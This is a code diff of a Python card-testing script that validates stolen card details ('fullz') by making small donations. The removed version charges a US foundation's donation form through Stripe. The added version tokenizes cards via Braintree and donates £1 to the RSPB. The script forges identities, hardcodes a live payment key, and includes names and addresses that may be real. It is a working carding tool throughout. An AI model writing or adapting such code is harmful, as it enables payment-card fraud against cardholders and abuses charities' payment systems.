@@ -1,186 +1,148 @@
-import asyncio
+ import asyncio
+import base64
 import random
 import time
-import json
-import base64,bs4
-import random
-import urllib3
-import uuid
-from faker import Faker
+from urllib.parse import urlparse
+from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 import requests
 from FUNC.defs import *
-import re
-from bs4 import BeautifulSoup
+import json
 
 
-
-
-session = requests.session()
-        
-def gets(s, start, end):
-            try:
-                start_index = s.index(start) + len(start)
-                end_index = s.index(end, start_index)
-                return s[start_index:end_index]
-            except ValueError:
-                return None
-
-
-def generate_fake_email():
-    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
-    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(random.randint(5,10)))
-    numbers = ''.join(random.choice('1234567890') for i in range(random.randint(4,5)))
-    domain = random.choice(domains)
-    return name + numbers + '@' + domain
-
-def time_page():
-    numbers = ''.join(random.choice('1234567890') for i in range(6))
-    return numbers
-
-fake = Faker()
-name = fake.first_name()
-email = generate_fake_email()
-country = fake.country()
-address1 = fake.street_address()
-address2 = fake.secondary_address()
-city = fake.city()
-statee = fake.state()
-state = fake.state_abbr()
-zip = fake.zipcode_in_state(state)
-phone = "+202" + fake.numerify("#########")
-agent = fake.user_agent()
-
-ptime = time_page()
-guid = str(uuid.uuid4())
-muid = str(uuid.uuid4())
-sid = str(uuid.uuid4())
-session = requests.Session()
-
-
-async def create_cvv_charge(fullz , session):
+async def create_shopify_charge(fullz, session):
     try:
-        cc , mes , ano , cvv = fullz.split("|")
+        cc, mes, ano, cvv = fullz.split("|")
+        cc1 = cc[:4]
+        cc2 = cc[4:8]
+        cc3 = cc[8:12]
+        cc4 = cc[12:]
+        user_agent = UserAgent().random
+        random_data = await get_random_info(session)
+        fname = random_data["fname"]
+        lname = random_data["lname"]
+        email = random_data["email"]
+        address             = "12 Main Street"
+        city                = "Brewster"
+        state               = "New York"
+        state_short         = "NY"
+        country             = "United States"
+        zip_code            ="10509"
+        phone               ="(727) 945-1000"
 
+        response = requests.get('https://api-cdn.rspb.org.uk/payments/token')
 
-        session =requests.Session()
-        email="craish"+str(random.randint(548,98698))+"niki@gmail.com"
+        # print(response.text)
 
-        headers = {
-    'authority': 'pipelineforchangefoundation.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': agent,
-}
-        
-        req1 = session.get("https://pipelineforchangefoundation.com/donate/", headers=headers,  verify=False, timeout=30)
-        nonce = re.findall(r'name="_charitable_donation_nonce" value="(.*?)"', req1.text)[0]
-        form_id = re.findall(r'name="charitable_form_id" value="(.*?)"', req1.text)[0]
-                
-        session.cookies.update(req1.cookies)
-        headers = {
-    'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': agent,
-        }
-
-        data = {
-        'type':'card',
-        'billing_details[name]':f'{name}',
-        'billing_details[email]':f'{email}',
-        'billing_details[address][city]':f'{city}',
-        'billing_details[address][country]':'US',
-        'billing_details[address][line1]':f'{address1}',      
-        'billing_details[address][postal_code]':f'{zip}',     
-        'billing_details[address][state]':'Texas',
-        'billing_details[phone]':'+202814880301',
-        'card[number]':f'{cc}',
-        'card[cvc]':f'{cvv}',
-        'card[exp_month]':f'{mes}',
-        'card[exp_year]':f'{ano}',
-        'guid':f'{guid}',
-        'muid':f'{muid}',
-        'sid':f'{sid}',
-        'referrer':'https://pipelineforchangefoundation.com',
-        'time_on_page': ptime,
-        'key':'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
-}
-        
-        req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data,  verify=False, timeout=30)
         try:
-            id=req2.json()['id']
+            auth_token=response.json()['payload']
+            decode_tok = base64.b64decode(auth_token).decode('utf-8')
+            auth = json.loads(decode_tok).get('authorizationFingerprint')
+            # print(auth)
         except:
-                pass
-        print(id)
+            return response.text
+
+
+                
         headers = {
-    'authority': 'pipelineforchangefoundation.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://pipelineforchangefoundation.com',
-    'referer': 'https://pipelineforchangefoundation.com/donate/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': agent,
-    'x-requested-with': 'XMLHttpRequest',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'authorization': f'Bearer {auth}',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'priority': 'u=1, i',
+            'referer': 'https://assets.braintreegateway.com/',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'cross-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
         }
 
-        data = {
-            'charitable_form_id': form_id,
-            f'{form_id}': '',
-            '_charitable_donation_nonce': nonce,
-            '_wp_http_referer': '/donate/',
-            'campaign_id': '690',
-            'description': 'Donate to Pipeline for Change Foundation',
-            'ID': '0',
-            'recurring_donation': 'once',
-            'custom_recurring_donation_amount': '',
-            'recurring_donation_period': 'once',
-            'donation_amount': 'custom',
-            'custom_donation_amount': '5.00',
-            'first_name': name,
-            'last_name': name,
-            'email': email,
-            'address': address1,
-            'address_2': '',
-            'city': city,
-            'state': state,
-            'postcode': zip,
-            'country': 'US',
-            'phone': phone,
-            'gateway': 'stripe',
-            'stripe_payment_method': id,
-            'action': 'make_donation',
-            'form_action': 'make_donation',
+        json_data = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+                'sessionId': 'adf341da-702c-49ed-8316-c7f278c737b6',
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': cc,
+                        'expirationMonth': mes,
+                        'expirationYear': ano,
+                        'cvv': cvv,
+                        'cardholderName': 'Micah Schiller',
+                    },
+                    'options': {
+                        'validate': False,
+                    },
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
         }
 
-        req3 = session.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php", headers=headers, data=data,  verify=False, timeout=30)
-        print(req3.text)
-        await asyncio.sleep(2)
-        return req3
+        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+        try:
+            token=response.json()['data']['tokenizeCreditCard']['token']
+            # print(token)
+        except:
+            return response.text
+
+
+        
+        params = {
+            'lang': 'en-gb',
+        }
+
+        json_data = {
+            'sourceCode': None,
+            'productCode': 'WEB',
+            'payer': {
+                'identityId': None,
+                'title': 'Mr',
+                'firstName': 'Crish',
+                'lastName': 'Niki',
+                'emailAddress': 'crishniki158@gmail.com',
+                'giftAid': False,
+                'dob': None,
+                'address': {
+                    'line1': '2 Wentworth Terrace',
+                    'line2': '',
+                    'line3': '',
+                    'town': 'Wakefield',
+                    'county': '',
+                    'postcode': 'WF1 3QN',
+                    'country': 'United Kingdom',
+                },
+                'dpaPreferences': {
+                    'email': False,
+                    'post': False,
+                    'phone': False,
+                    'text': False,
+                    'phoneNumber': '',
+                    'mobileNumber': '',
+                },
+            },
+            'payment': {
+                'frequency': 'oneOff',
+                'amount': 1,
+                'accountName': '',
+                'accountNumber': '',
+                'sortCode': '',
+                'token': token,
+                'clientDeviceData': '{"correlation_id":"5a1fd268a680a1de7784890c684f3059"}',
+            },
+        }
+
+        response = requests.post('https://api-cdn.rspb.org.uk/donations/donate', params=params, json=json_data)
+
+        print(response.text)
+
+        return response.text
 
     except Exception as e:
         return str(e)
+            
